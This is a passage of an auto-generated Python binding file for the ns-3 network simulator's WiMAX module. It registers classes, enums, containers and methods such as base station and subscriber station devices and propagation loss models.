module.add_class('BsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::BsServiceFlowManager'])
module.add_class('CallbackChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('CallbackImplBase', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])
module.add_class('CallbackValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('Channel', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('ConnectionManager', parent=root_module['ns3::Object'])
module.add_class('Dcd', parent=root_module['ns3::Header'])
module.add_class('DlMap', parent=root_module['ns3::Header'])
module.add_class('DsaAck', parent=root_module['ns3::Header'])
module.add_class('DsaReq', parent=root_module['ns3::Header'])
module.add_class('DsaRsp', parent=root_module['ns3::Header'])
module.add_class('EmptyAttributeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('EventImpl', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])
module.add_class('FixedRssLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('FragmentationSubheader', parent=root_module['ns3::Header'])
module.add_class('FriisPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('GenericMacHeader', parent=root_module['ns3::Header'])
module.add_class('GrantManagementSubheader', parent=root_module['ns3::Header'])
module.add_class('IpcsClassifier', parent=root_module['ns3::Object'])
module.add_class('Ipv4AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv4AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('Ipv4MaskChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv4MaskValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('Ipv6AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv6AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('Ipv6PrefixChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Ipv6PrefixValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('LogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('Mac48AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('Mac48AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('MatrixPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('NakagamiPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('NetDevice', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_enum('PacketType', ['PACKET_HOST', 'NS3_PACKET_HOST', 'PACKET_BROADCAST', 'NS3_PACKET_BROADCAST', 'PACKET_MULTICAST', 'NS3_PACKET_MULTICAST', 'PACKET_OTHERHOST', 'NS3_PACKET_OTHERHOST'], outer_class=root_module['ns3::NetDevice'], import_from_module='ns.network')
module.add_class('NixVector', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])
module.add_class('Node', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('ObjectFactoryChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('ObjectFactoryValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('OutputStreamWrapper', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])
module.add_class('Packet', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])
module.add_class('RandomVariableChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('RandomVariableValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('SimpleOfdmWimaxPhy', parent=root_module['ns3::WimaxPhy'])
module.add_enum('FrameDurationCode', ['FRAME_DURATION_2_POINT_5_MS', 'FRAME_DURATION_4_MS', 'FRAME_DURATION_5_MS', 'FRAME_DURATION_8_MS', 'FRAME_DURATION_10_MS', 'FRAME_DURATION_12_POINT_5_MS', 'FRAME_DURATION_20_MS'], outer_class=root_module['ns3::SimpleOfdmWimaxPhy'])
module.add_class('TimeChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('TimeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('TypeIdChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])
module.add_class('TypeIdValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('UintegerValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])
module.add_class('WimaxChannel', parent=root_module['ns3::Channel'])
module.add_class('WimaxNetDevice', parent=root_module['ns3::NetDevice'])
module.add_enum('Direction', ['DIRECTION_DOWNLINK', 'DIRECTION_UPLINK'], outer_class=root_module['ns3::WimaxNetDevice'])
module.add_enum('RangingStatus', ['RANGING_STATUS_EXPIRED', 'RANGING_STATUS_CONTINUE', 'RANGING_STATUS_ABORT', 'RANGING_STATUS_SUCCESS'], outer_class=root_module['ns3::WimaxNetDevice'])
module.add_class('AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])
module.add_class('AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])
module.add_class('BaseStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])
module.add_enum('State', ['BS_STATE_DL_SUB_FRAME', 'BS_STATE_UL_SUB_FRAME', 'BS_STATE_TTG', 'BS_STATE_RTG'], outer_class=root_module['ns3::BaseStationNetDevice'])
module.add_enum('MacPreamble', ['SHORT_PREAMBLE', 'LONG_PREAMBLE'], outer_class=root_module['ns3::BaseStationNetDevice'])
module.add_class('SimpleOfdmWimaxChannel', parent=root_module['ns3::WimaxChannel'])
module.add_enum('PropModel', ['RANDOM_PROPAGATION', 'FRIIS_PROPAGATION', 'LOG_DISTANCE_PROPAGATION', 'COST231_PROPAGATION'], outer_class=root_module['ns3::SimpleOfdmWimaxChannel'])
module.add_class('SubscriberStationNetDevice', parent=root_module['ns3::WimaxNetDevice'])
module.add_enum('State', ['SS_STATE_IDLE', 'SS_STATE_SCANNING', 'SS_STATE_SYNCHRONIZING', 'SS_STATE_ACQUIRING_PARAMETERS', 'SS_STATE_WAITING_REG_RANG_INTRVL', 'SS_STATE_WAITING_INV_RANG_INTRVL', 'SS_STATE_WAITING_RNG_RSP', 'SS_STATE_ADJUSTING_PARAMETERS', 'SS_STATE_REGISTERED', 'SS_STATE_TRANSMITTING', 'SS_STATE_STOPPED'], outer_class=root_module['ns3::SubscriberStationNetDevice'])
module.add_enum('EventType', ['EVENT_NONE', 'EVENT_WAIT_FOR_RNG_RSP', 'EVENT_DL_MAP_SYNC_TIMEOUT', 'EVENT_LOST_DL_MAP', 'EVENT_LOST_UL_MAP', 'EVENT_DCD_WAIT_TIMEOUT', 'EVENT_UCD_WAIT_TIMEOUT', 'EVENT_RANG_OPP_WAIT_TIMEOUT'], outer_class=root_module['ns3::SubscriberStationNetDevice'])
module.add_container('std::vector< ns3::ServiceFlow * >', 'ns3::ServiceFlow *', container_type='vector')
module.add_container('std::vector< bool >', 'bool', container_type='vector')
module.add_container('ns3::bvec', 'bool', container_type='vector')
module.add_container('std::vector< ns3::DlFramePrefixIe >', 'ns3::DlFramePrefixIe', container_type='vector')
module.add_container('std::list< ns3::Ptr< ns3::Packet > >', 'ns3::Ptr< ns3::Packet >', container_type='list')
module.add_container('std::vector< ns3::SSRecord * >', 'ns3::SSRecord *', container_type='vector')
module.add_container('std::vector< ns3::OfdmUlBurstProfile >', 'ns3::OfdmUlBurstProfile', container_type='vector')
module.add_container('std::list< ns3::OfdmUlMapIe >', 'ns3::OfdmUlMapIe', container_type='list')
module.add_container('std::list< ns3::Ptr< ns3::UlJob > >', 'ns3::Ptr< ns3::UlJob >', container_type='list')
module.add_container('std::list< ns3::Ptr< ns3::Packet const > >', 'ns3::Ptr< ns3::Packet const >', container_type='list')
module.add_container('std::deque< ns3::WimaxMacQueue::QueueElement >', 'ns3::WimaxMacQueue::QueueElement', container_type='dequeue')
module.add_container('std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > >', 'std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > >', container_type='list')
module.add_container('std::vector< ns3::Ptr< ns3::WimaxConnection > >', 'ns3::Ptr< ns3::WimaxConnection >', container_type='vector')
module.add_container('std::vector< ns3::OfdmDlBurstProfile >', 'ns3::OfdmDlBurstProfile', container_type='vector')
module.add_container('std::list< ns3::OfdmDlMapIe >', 'ns3::OfdmDlMapIe', container_type='list')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogNodePrinter')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogNodePrinter*')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogNodePrinter&')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *', 'ns3::LogTimePrinter')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) **', 'ns3::LogTimePrinter*')
typehandlers.add_type_alias('void ( * ) ( std::ostream & ) *&', 'ns3::LogTimePrinter&')
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >', 'ns3::bvec')
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >*', 'ns3::bvec*')
typehandlers.add_type_alias('std::vector< bool, std::allocator< bool > >&', 'ns3::bvec&')
nested_module = module.add_cpp_namespace('FatalImpl')
register_types_ns3_FatalImpl(nested_module)
nested_module = module.add_cpp_namespace('internal')
register_types_ns3_internal(nested_module)
def register_types_ns3_FatalImpl(module):
root_module = module.get_root()
def register_types_ns3_internal(module):
root_module = module.get_root()
def register_methods(root_module):
register_Ns3Address_methods(root_module, root_module['ns3::Address'])
register_Ns3AsciiTraceHelper_methods(root_module, root_module['ns3::AsciiTraceHelper'])
register_Ns3AsciiTraceHelperForDevice_methods(root_module, root_module['ns3::AsciiTraceHelperForDevice'])
register_Ns3AttributeConstructionList_methods(root_module, root_module['ns3::AttributeConstructionList'])
register_Ns3AttributeConstructionListItem_methods(root_module, root_module['ns3::AttributeConstructionList::Item'])
register_Ns3Buffer_methods(root_module, root_module['ns3::Buffer'])
register_Ns3BufferIterator_methods(root_module, root_module['ns3::Buffer::Iterator'])
register_Ns3ByteTagIterator_methods(root_module, root_module['ns3::ByteTagIterator'])
register_Ns3ByteTagIteratorItem_methods(root_module, root_module['ns3::ByteTagIterator::Item'])
register_Ns3ByteTagList_methods(root_module, root_module['ns3::ByteTagList'])
register_Ns3ByteTagListIterator_methods(root_module, root_module['ns3::ByteTagList::Iterator'])
register_Ns3ByteTagListIteratorItem_methods(root_module, root_module['ns3::ByteTagList::Iterator::Item'])
register_Ns3CallbackBase_methods(root_module, root_module['ns3::CallbackBase'])
register_Ns3Cid_methods(root_module, root_module['ns3::Cid'])
register_Ns3CidFactory_methods(root_module, root_module['ns3::CidFactory'])
register_Ns3CsParameters_methods(root_module, root_module['ns3::CsParameters'])
register_Ns3DcdChannelEncodings_methods(root_module, root_module['ns3::DcdChannelEncodings'])
register_Ns3DlFramePrefixIe_methods(root_module, root_module['ns3::DlFramePrefixIe'])
register_Ns3EventId_methods(root_module, root_module['ns3::EventId'])
register_Ns3IpcsClassifierRecord_methods(root_module, root_module['ns3::IpcsClassifierRecord'])
register_Ns3Ipv4Address_methods(root_module, root_module['ns3::Ipv4Address'])
register_Ns3Ipv4Mask_methods(root_module, root_module['ns3::Ipv4Mask'])
register_Ns3Ipv6Address_methods(root_module, root_module['ns3::Ipv6Address'])
register_Ns3Ipv6Prefix_methods(root_module, root_module['ns3::Ipv6Prefix'])
register_Ns3LogComponent_methods(root_module, root_module['ns3::LogComponent'])
register_Ns3Mac48Address_methods(root_module, root_module['ns3::Mac48Address'])
register_Ns3NetDeviceContainer_methods(root_module, root_module['ns3::NetDeviceContainer'])
register_Ns3NodeContainer_methods(root_module, root_module['ns3::NodeContainer'])
register_Ns3ObjectBase_methods(root_module, root_module['ns3::ObjectBase'])
register_Ns3ObjectDeleter_methods(root_module, root_module['ns3::ObjectDeleter'])
register_Ns3ObjectFactory_methods(root_module, root_module['ns3::ObjectFactory'])
register_Ns3OfdmDcdChannelEncodings_methods(root_module, root_module['ns3::OfdmDcdChannelEncodings'])
register_Ns3OfdmDlBurstProfile_methods(root_module, root_module['ns3::OfdmDlBurstProfile'])
register_Ns3OfdmDlMapIe_methods(root_module, root_module['ns3::OfdmDlMapIe'])
register_Ns3OfdmUlBurstProfile_methods(root_module, root_module['ns3::OfdmUlBurstProfile'])
register_Ns3OfdmUlMapIe_methods(root_module, root_module['ns3::OfdmUlMapIe'])
register_Ns3PacketMetadata_methods(root_module, root_module['ns3::PacketMetadata'])
register_Ns3PacketMetadataItem_methods(root_module, root_module['ns3::PacketMetadata::Item'])
register_Ns3PacketMetadataItemIterator_methods(root_module, root_module['ns3::PacketMetadata::ItemIterator'])
register_Ns3PacketTagIterator_methods(root_module, root_module['ns3::PacketTagIterator'])
register_Ns3PacketTagIteratorItem_methods(root_module, root_module['ns3::PacketTagIterator::Item'])
register_Ns3PacketTagList_methods(root_module, root_module['ns3::PacketTagList'])
register_Ns3PacketTagListTagData_methods(root_module, root_module['ns3::PacketTagList::TagData'])
register_Ns3PcapFile_methods(root_module, root_module['ns3::PcapFile'])
register_Ns3PcapHelper_methods(root_module, root_module['ns3::PcapHelper'])
register_Ns3PcapHelperForDevice_methods(root_module, root_module['ns3::PcapHelperForDevice'])
register_Ns3RandomVariable_methods(root_module, root_module['ns3::RandomVariable'])
register_Ns3SNRToBlockErrorRateManager_methods(root_module, root_module['ns3::SNRToBlockErrorRateManager'])
register_Ns3SNRToBlockErrorRateRecord_methods(root_module, root_module['ns3::SNRToBlockErrorRateRecord'])
register_Ns3SSRecord_methods(root_module, root_module['ns3::SSRecord'])
register_Ns3SeedManager_methods(root_module, root_module['ns3::SeedManager'])
register_Ns3SendParams_methods(root_module, root_module['ns3::SendParams'])
register_Ns3SequentialVariable_methods(root_module, root_module['ns3::SequentialVariable'])
register_Ns3ServiceFlow_methods(root_module, root_module['ns3::ServiceFlow'])
register_Ns3ServiceFlowRecord_methods(root_module, root_module['ns3::ServiceFlowRecord'])
register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])
register_Ns3Simulator_methods(root_module, root_module['ns3::Simulator'])
register_Ns3Tag_methods(root_module, root_module['ns3::Tag'])
register_Ns3TagBuffer_methods(root_module, root_module['ns3::TagBuffer'])
register_Ns3TlvValue_methods(root_module, root_module['ns3::TlvValue'])
register_Ns3TosTlvValue_methods(root_module, root_module['ns3::TosTlvValue'])
register_Ns3TriangularVariable_methods(root_module, root_module['ns3::TriangularVariable'])
register_Ns3TypeId_methods(root_module, root_module['ns3::TypeId'])
register_Ns3TypeIdAttributeInformation_methods(root_module, root_module['ns3::TypeId::AttributeInformation'])
register_Ns3TypeIdTraceSourceInformation_methods(root_module, root_module['ns3::TypeId::TraceSourceInformation'])
register_Ns3U16TlvValue_methods(root_module, root_module['ns3::U16TlvValue'])
register_Ns3U32TlvValue_methods(root_module, root_module['ns3::U32TlvValue'])
register_Ns3U8TlvValue_methods(root_module, root_module['ns3::U8TlvValue'])
register_Ns3UcdChannelEncodings_methods(root_module, root_module['ns3::UcdChannelEncodings'])
register_Ns3UniformVariable_methods(root_module, root_module['ns3::UniformVariable'])
register_Ns3VectorTlvValue_methods(root_module, root_module['ns3::VectorTlvValue'])
register_Ns3WeibullVariable_methods(root_module, root_module['ns3::WeibullVariable'])
register_Ns3WimaxHelper_methods(root_module, root_module['ns3::WimaxHelper'])
register_Ns3ZetaVariable_methods(root_module, root_module['ns3::ZetaVariable'])
register_Ns3ZipfVariable_methods(root_module, root_module['ns3::ZipfVariable'])
register_Ns3Empty_methods(root_module, root_module['ns3::empty'])
register_Ns3Int64x64_t_methods(root_module, root_module['ns3::int64x64_t'])
register_Ns3SimpleOfdmSendParam_methods(root_module, root_module['ns3::simpleOfdmSendParam'])
register_Ns3Chunk_methods(root_module, root_module['ns3::Chunk'])
register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, root_module['ns3::ClassificationRuleVectorTlvValue'])
register_Ns3ConstantVariable_methods(root_module, root_module['ns3::ConstantVariable'])
register_Ns3CsParamVectorTlvValue_methods(root_module, root_module['ns3::CsParamVectorTlvValue'])
register_Ns3DeterministicVariable_methods(root_module, root_module['ns3::DeterministicVariable'])
register_Ns3EmpiricalVariable_methods(root_module, root_module['ns3::EmpiricalVariable'])
register_Ns3ErlangVariable_methods(root_module, root_module['ns3::ErlangVariable'])
register_Ns3ExponentialVariable_methods(root_module, root_module['ns3::ExponentialVariable'])
register_Ns3GammaVariable_methods(root_module, root_module['ns3::GammaVariable'])
register_Ns3Header_methods(root_module, root_module['ns3::Header'])
register_Ns3IntEmpiricalVariable_methods(root_module, root_module['ns3::IntEmpiricalVariable'])
register_Ns3Ipv4AddressTlvValue_methods(root_module, root_module['ns3::Ipv4AddressTlvValue'])
register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, root_module['ns3::Ipv4AddressTlvValue::ipv4Addr'])
register_Ns3LogNormalVariable_methods(root_module, root_module['ns3::LogNormalVariable'])
register_Ns3MacHeaderType_methods(root_module, root_module['ns3::MacHeaderType'])
register_Ns3ManagementMessageType_methods(root_module, root_module['ns3::ManagementMessageType'])
register_Ns3NormalVariable_methods(root_module, root_module['ns3::NormalVariable'])
register_Ns3Object_methods(root_module, root_module['ns3::Object'])
register_Ns3ObjectAggregateIterator_methods(root_module, root_module['ns3::Object::AggregateIterator'])
register_Ns3OfdmDownlinkFramePrefix_methods(root_module, root_module['ns3::OfdmDownlinkFramePrefix'])
register_Ns3OfdmSendParams_methods(root_module, root_module['ns3::OfdmSendParams'])
register_Ns3OfdmUcdChannelEncodings_methods(root_module, root_module['ns3::OfdmUcdChannelEncodings'])
register_Ns3PacketBurst_methods(root_module, root_module['ns3::PacketBurst'])
register_Ns3ParetoVariable_methods(root_module, root_module['ns3::ParetoVariable'])
register_Ns3PcapFileWrapper_methods(root_module, root_module['ns3::PcapFileWrapper'])
register_Ns3PortRangeTlvValue_methods(root_module, root_module['ns3::PortRangeTlvValue'])
register_Ns3PortRangeTlvValuePortRange_methods(root_module, root_module['ns3::PortRangeTlvValue::PortRange'])
register_Ns3PriorityUlJob_methods(root_module, root_module['ns3::PriorityUlJob'])
register_Ns3PropagationLossModel_methods(root_module, root_module['ns3::PropagationLossModel'])
register_Ns3ProtocolTlvValue_methods(root_module, root_module['ns3::ProtocolTlvValue'])
register_Ns3RandomPropagationLossModel_methods(root_module, root_module['ns3::RandomPropagationLossModel'])
register_Ns3RangePropagationLossModel_methods(root_module, root_module['ns3::RangePropagationLossModel'])
register_Ns3RngReq_methods(root_module, root_module['ns3::RngReq'])
register_Ns3RngRsp_methods(root_module, root_module['ns3::RngRsp'])
register_Ns3SSManager_methods(root_module, root_module['ns3::SSManager'])
register_Ns3ServiceFlowManager_methods(root_module, root_module['ns3::ServiceFlowManager'])
register_Ns3SfVectorTlvValue_methods(root_module, root_module['ns3::SfVectorTlvValue'])
register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])
register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])
register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])
register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])
register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])
register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])
register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter<ns3::OutputStreamWrapper> >'])
register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter<ns3::Packet> >'])
register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])
register_Ns3SsServiceFlowManager_methods(root_module, root_module['ns3::SsServiceFlowManager'])
register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, root_module['ns3::ThreeLogDistancePropagationLossModel'])
register_Ns3Time_methods(root_module, root_module['ns3::Time'])
register_Ns3Tlv_methods(root_module, root_module['ns3::Tlv'])
register_Ns3TraceSourceAccessor_methods(root_module, root_module['ns3::TraceSourceAccessor'])
register_Ns3Trailer_methods(root_module, root_module['ns3::Trailer'])
register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, root_module['ns3::TwoRayGroundPropagationLossModel'])
register_Ns3Ucd_methods(root_module, root_module['ns3::Ucd'])
register_Ns3UlJob_methods(root_module, root_module['ns3::UlJob'])
register_Ns3UlMap_methods(root_module, root_module['ns3::UlMap'])
register_Ns3UplinkScheduler_methods(root_module, root_module['ns3::UplinkScheduler'])
register_Ns3UplinkSchedulerMBQoS_methods(root_module, root_module['ns3::UplinkSchedulerMBQoS'])
register_Ns3UplinkSchedulerRtps_methods(root_module, root_module['ns3::UplinkSchedulerRtps'])
register_Ns3UplinkSchedulerSimple_methods(root_module, root_module['ns3::UplinkSchedulerSimple'])
register_Ns3WimaxConnection_methods(root_module, root_module['ns3::WimaxConnection'])
register_Ns3WimaxMacQueue_methods(root_module, root_module['ns3::WimaxMacQueue'])
register_Ns3WimaxMacToMacHeader_methods(root_module, root_module['ns3::WimaxMacToMacHeader'])
register_Ns3WimaxPhy_methods(root_module, root_module['ns3::WimaxPhy'])
register_Ns3AttributeAccessor_methods(root_module, root_module['ns3::AttributeAccessor'])
register_Ns3AttributeChecker_methods(root_module, root_module['ns3::AttributeChecker'])
register_Ns3AttributeValue_methods(root_module, root_module['ns3::AttributeValue'])
register_Ns3BSScheduler_methods(root_module, root_module['ns3::BSScheduler'])
register_Ns3BSSchedulerRtps_methods(root_module, root_module['ns3::BSSchedulerRtps'])
register_Ns3BSSchedulerSimple_methods(root_module, root_module['ns3::BSSchedulerSimple'])
register_Ns3BandwidthRequestHeader_methods(root_module, root_module['ns3::BandwidthRequestHeader'])
register_Ns3BsServiceFlowManager_methods(root_module, root_module['ns3::BsServiceFlowManager'])
register_Ns3CallbackChecker_methods(root_module, root_module['ns3::CallbackChecker'])
register_Ns3CallbackImplBase_methods(root_module, root_module['ns3::CallbackImplBase'])
register_Ns3CallbackValue_methods(root_module, root_module['ns3::CallbackValue'])
register_Ns3Channel_methods(root_module, root_module['ns3::Channel'])
register_Ns3ConnectionManager_methods(root_module, root_module['ns3::ConnectionManager'])
register_Ns3Dcd_methods(root_module, root_module['ns3::Dcd'])
register_Ns3DlMap_methods(root_module, root_module['ns3::DlMap'])
register_Ns3DsaAck_methods(root_module, root_module['ns3::DsaAck'])
register_Ns3DsaReq_methods(root_module, root_module['ns3::DsaReq'])
register_Ns3DsaRsp_methods(root_module, root_module['ns3::DsaRsp'])
register_Ns3EmptyAttributeValue_methods(root_module, root_module['ns3::EmptyAttributeValue'])
register_Ns3EventImpl_methods(root_module, root_module['ns3::EventImpl'])
register_Ns3FixedRssLossModel_methods(root_module, root_module['ns3::FixedRssLossModel'])
register_Ns3FragmentationSubheader_methods(root_module, root_module['ns3::FragmentationSubheader'])
register_Ns3FriisPropagationLossModel_methods(root_module, root_module['ns3::FriisPropagationLossModel'])
register_Ns3GenericMacHeader_methods(root_module, root_module['ns3::GenericMacHeader'])
register_Ns3GrantManagementSubheader_methods(root_module, root_module['ns3::GrantManagementSubheader'])
register_Ns3IpcsClassifier_methods(root_module, root_module['ns3::IpcsClassifier'])
register_Ns3Ipv4AddressChecker_methods(root_module, root_module['ns3::Ipv4AddressChecker'])
register_Ns3Ipv4AddressValue_methods(root_module, root_module['ns3::Ipv4AddressValue'])
register_Ns3Ipv4MaskChecker_methods(root_module, root_module['ns3::Ipv4MaskChecker'])
register_Ns3Ipv4MaskValue_methods(root_module, root_module['ns3::Ipv4MaskValue'])
register_Ns3Ipv6AddressChecker_methods(root_module, root_module['ns3::Ipv6AddressChecker'])
register_Ns3Ipv6AddressValue_methods(root_module, root_module['ns3::Ipv6AddressValue'])
register_Ns3Ipv6PrefixChecker_methods(root_module, root_module['ns3::Ipv6PrefixChecker'])
register_Ns3Ipv6PrefixValue_methods(root_module, root_module['ns3::Ipv6PrefixValue'])
register_Ns3LogDistancePropagationLossModel_methods(root_module, root_module['ns3::LogDistancePropagationLossModel'])
register_Ns3Mac48AddressChecker_methods(root_module, root_module['ns3::Mac48AddressChecker'])
register_Ns3Mac48AddressValue_methods(root_module, root_module['ns3::Mac48AddressValue'])
register_Ns3MatrixPropagationLossModel_methods(root_module, root_module['ns3::MatrixPropagationLossModel'])
register_Ns3NakagamiPropagationLossModel_methods(root_module, root_module['ns3::NakagamiPropagationLossModel'])
register_Ns3NetDevice_methods(root_module, root_module['ns3::NetDevice'])
register_Ns3NixVector_methods(root_module, root_module['ns3::NixVector'])
register_Ns3Node_methods(root_module, root_module['ns3::Node'])
register_Ns3ObjectFactoryChecker_methods(root_module, root_module['ns3::ObjectFactoryChecker'])
register_Ns3ObjectFactoryValue_methods(root_module, root_module['ns3::ObjectFactoryValue'])
register_Ns3OutputStreamWrapper_methods(root_module, root_module['ns3::OutputStreamWrapper'])
register_Ns3Packet_methods(root_module, root_module['ns3::Packet'])
register_Ns3RandomVariableChecker_methods(root_module, root_module['ns3::RandomVariableChecker'])
register_Ns3RandomVariableValue_methods(root_module, root_module['ns3::RandomVariableValue'])
register_Ns3SimpleOfdmWimaxPhy_methods(root_module, root_module['ns3::SimpleOfdmWimaxPhy'])
register_Ns3TimeChecker_methods(root_module, root_module['ns3::TimeChecker'])
register_Ns3TimeValue_methods(root_module, root_module['ns3::TimeValue'])
register_Ns3TypeIdChecker_methods(root_module, root_module['ns3::TypeIdChecker'])
register_Ns3TypeIdValue_methods(root_module, root_module['ns3::TypeIdValue'])
register_Ns3UintegerValue_methods(root_module, root_module['ns3::UintegerValue'])
register_Ns3WimaxChannel_methods(root_module, root_module['ns3::WimaxChannel'])
register_Ns3WimaxNetDevice_methods(root_module, root_module['ns3::WimaxNetDevice'])
register_Ns3AddressChecker_methods(root_module, root_module['ns3::AddressChecker'])
register_Ns3AddressValue_methods(root_module, root_module['ns3::AddressValue'])
register_Ns3BaseStationNetDevice_methods(root_module, root_module['ns3::BaseStationNetDevice'])
register_Ns3SimpleOfdmWimaxChannel_methods(root_module, root_module['ns3::SimpleOfdmWimaxChannel'])
register_Ns3SubscriberStationNetDevice_methods(root_module, root_module['ns3::SubscriberStationNetDevice'])
return
def register_Ns3Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'type'), param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])
cls.add_constructor([param('ns3::Address const &', 'address')])
cls.add_method('CheckCompatible',
'bool',
[param('uint8_t', 'type'), param('uint8_t', 'len')],
is_const=True)
cls.add_method('CopyAllFrom',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])
cls.add_method('CopyAllTo',
'uint32_t',
